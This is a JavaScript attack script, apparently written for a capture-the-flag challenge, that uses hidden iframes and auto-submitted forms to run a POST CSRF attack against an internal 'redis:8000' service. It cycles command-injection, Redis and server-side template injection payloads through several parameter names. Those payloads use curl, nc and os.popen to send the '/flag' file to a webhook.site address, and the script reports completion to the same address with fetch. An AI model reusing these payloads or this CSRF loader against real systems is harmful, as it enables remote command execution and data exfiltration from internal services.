(async () => {
    const WEBHOOK = 'https://webhook.site/144fdef3-ea07-4316-bff4-7619115f30f3';
    const TARGET = 'http://redis:8000';

    // 1. GET 방식 공격 (이미지 태그 - 기존과 동일)
    // ... (작성하신 코드 그대로 사용) ...

    // 2. [NEW] POST 방식 공격 (Form Auto-Submit CSRF)
    // 화면이 전환되므로 가장 마지막에 실행해야 합니다.
    // 하지만 우리는 여러 페이로드를 보내야 하므로, 
    // '숨겨진 iframe'을 여러 개 만들어서 그 안에서 폼을 제출시킵니다.

    const postPayloads = [
        // [Command Injection]
        `curl -X POST -d @/flag ${WEBHOOK}`,
        `cat /flag | nc ${WEBHOOK.replace('https://webhook.site/', '')} 80`, // nc가 있을 수도 있음
        // [Redis Command] (혹시 진짜 Redis Web Console이라면?)
        `CONFIG SET dir /app/static`,
        `slaveof no one`,
        // [SSTI]
        `{{ config }}`,
        `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('curl -d @/flag ${WEBHOOK}').read() }}`
    ];

    const params = ['cmd', 'command', 'q', 'query', 'code', 'search'];

    // POST CSRF 함수
    const triggerPostCSRF = (paramName, payloadValue) => {
        return new Promise(resolve => {
            // 1. iframe 생성 (폼 제출이 메인 페이지를 이동시키지 않도록)
            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            iframe.name = `csrf-frame-${Math.random()}`;
            document.body.appendChild(iframe);

            // 2. Form 생성
            const form = document.createElement('form');
            form.method = 'POST';
            form.action = TARGET + '/'; // 루트 경로로 POST
            form.target = iframe.name;   // 응답을 iframe에서 받음
            form.style.display = 'none';

            // 3. Input 생성
            const input = document.createElement('input');
            input.type = 'hidden';
            input.name = paramName;
            input.value = payloadValue;
            form.appendChild(input);

            // 4. 제출
            document.body.appendChild(form);
            form.submit();

            // 5. 청소 (메모리 누수 방지 및 딜레이)
            setTimeout(() => {
                iframe.remove();
                form.remove();
                resolve();
            }, 500); // 0.5초 간격
        });
    };

    // 순차적으로 POST 공격 실행
    for (const param of params) {
        for (const payload of postPayloads) {
            await triggerPostCSRF(param, payload);
        }
    }

    // 공격 완료 보고
    fetch(WEBHOOK, {
        method: 'POST',
        mode: 'no-cors',
        body: JSON.stringify({
            msg: "POST CSRF Attack Completed",
            target: TARGET,
            location: window.location.href
        })
    });
})();
